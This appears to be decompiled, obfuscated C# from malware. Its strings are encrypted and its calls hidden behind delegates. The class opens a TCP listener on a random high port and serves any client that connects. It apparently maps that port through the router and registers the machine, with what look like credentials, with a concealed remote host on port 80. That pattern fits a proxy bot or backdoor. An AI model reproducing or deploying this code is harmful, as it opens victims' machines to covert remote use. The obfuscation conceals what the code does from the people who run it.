using System;
using System.Net.Sockets;
using System.Threading;

internal class Class19
{
	private static Random random_0 = Delegate208.smethod_0();

	public static int int_0 = Delegate94.smethod_2(Delegate272.smethod_0(random_0, 2000, 20000));

	public static string string_0 = (string)_003CModule_003E.smethod_0(3219864992u);

	public static bool bool_0 = false;

	public static bool bool_1 = false;

	public static string smethod_0()
	{
		return Delegate80.smethod_0(new string[11]
		{
			(string)_003CModule_003E.smethod_0(2285541750u),
			Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(2285541260u), Class11.string_1)),
			(string)_003CModule_003E.smethod_0(2285541963u),
			Delegate59.smethod_1(Delegate110.smethod_0((string)_003CModule_003E.smethod_0(2285541260u), int_0)),
			(string)_003CModule_003E.smethod_0(2285541732u),
			Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(2285541260u), Class2.string_6)),
			(string)_003CModule_003E.smethod_0(2285541652u),
			Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(2285541260u), Class2.string_7)),
			(string)_003CModule_003E.smethod_0(2285541636u),
			Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(2285541260u), string_0)),
			(string)_003CModule_003E.smethod_0(2285541341u)
		});
	}

	public static void smethod_1()
	{
		bool_1 = false;
	}

	public static void smethod_2()
	{
		Delegate115.smethod_1(Delegate113.smethod_0(smethod_4));
		Delegate82.smethod_2(5000);
		bool_1 = true;
		Delegate115.smethod_1(Delegate113.smethod_0(smethod_3));
		Delegate115.smethod_1(Delegate113.smethod_0(smethod_5));
	}

	public static void smethod_3()
	{
		TcpListener object_ = Delegate266.smethod_0(int_0);
		Delegate267.smethod_0(object_);
		while (bool_1)
		{
			TcpClient tcpClient_ = Delegate268.smethod_0(object_);
			Class17 @object = Delegate269.smethod_0(tcpClient_);
			Thread object_2 = Delegate113.smethod_0(@object.method_0);
			Delegate115.smethod_0(object_2);
		}
		Delegate267.smethod_1(object_);
	}

	public static void smethod_4()
	{
		try
		{
			Delegate241.smethod_1();
			Delegate270.smethod_0(int_0, int_0, (string)_003CModule_003E.smethod_0(4077845177u), Class2.string_1);
			string_0 = (string)_003CModule_003E.smethod_0(4077845169u);
		}
		catch
		{
		}
	}

	public static void smethod_5()
	{
		Delegate82.smethod_2(10000);
		try
		{
			Delegate271.smethod_0(Class11.string_1, int_0, (string)_003CModule_003E.smethod_0(1566673645u), 80, Class2.string_6, Class2.string_7);
			Delegate64.smethod_3(Delegate70.smethod_14(), Delegate70.smethod_4());
			bool_0 = true;
		}
		catch
		{
		}
	}
}
